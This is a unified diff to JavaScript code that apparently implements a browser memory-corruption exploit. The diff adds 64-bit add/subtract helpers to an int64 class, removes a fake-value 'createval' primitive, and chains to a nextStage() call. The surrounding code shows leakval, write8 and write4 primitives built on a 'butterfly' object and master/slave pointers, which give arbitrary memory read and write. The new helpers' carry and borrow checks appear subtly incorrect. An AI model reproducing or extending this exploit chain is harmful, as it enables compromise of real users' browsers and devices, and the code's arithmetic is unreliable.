@@ -67,6 +67,27 @@ function int64(low, hi) {
         return new int64(new_lo, new_hi);
     }
 
+    this.add64 = function(val) {
+        var new_lo = (((this.low >>> 0) + val.low) & 0xFFFFFFFF) >>> 0;
+        var new_hi = (this.hi >>> 0);
+
+        if (new_lo > (this.low) & 0xFFFFFFFF) {
+            new_hi++;
+        }
+        new_hi = (((new_hi >>> 0) + val.hi) & 0xFFFFFFFF) >>> 0;
+        return new int64(new_lo, new_hi);
+    }
+    this.sub64 = function(val) {
+        var new_lo = (((this.low >>> 0) - val.low) & 0xFFFFFFFF) >>> 0;
+        var new_hi = (this.hi >>> 0);
+
+        if (new_lo > (this.low) & 0xFFFFFFFF) {
+            new_hi--;
+        }
+        new_hi = (((new_hi >>> 0) - val.hi) & 0xFFFFFFFF) >>> 0;
+        return new int64(new_lo, new_hi);
+    }
+
     this.sub32inplace = function (val) {
         var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
         var new_hi = (this.hi >>> 0);
@@ -316,17 +337,10 @@ var prim = {
         this.write8(butterfly, new int64(0x41414141, 0xffff0000));
 
         return rtv;
-    },
-
-    createval: function (jsval) {
-        this.write8(butterfly, jsval);
-        var rt = leakval_helper[0];
-        this.write8(butterfly, new int64(0x41414141, 0xffff0000));
-        return rt;
     }
 };
 prim.write4(prim.leakval(master).add32(0x18), 0x18);
 prim.write4(slave_ptr_ptr.add32(0x18), 0x2);
 
 window.primitives = prim;
-if (window.postExpl) window.postExpl();
+nextStage();
